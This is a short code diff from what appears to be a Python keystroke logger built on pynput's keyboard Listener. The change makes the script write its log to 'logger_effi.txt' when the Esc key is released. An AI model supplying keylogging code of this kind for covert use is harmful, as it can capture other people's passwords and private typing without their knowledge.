@@ -59,8 +59,8 @@ def write_file(key,file):
 
 def on_release(key):
     if key == Key.esc:
+        write_file(now,'logger_effi.txt')
         return False
-
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
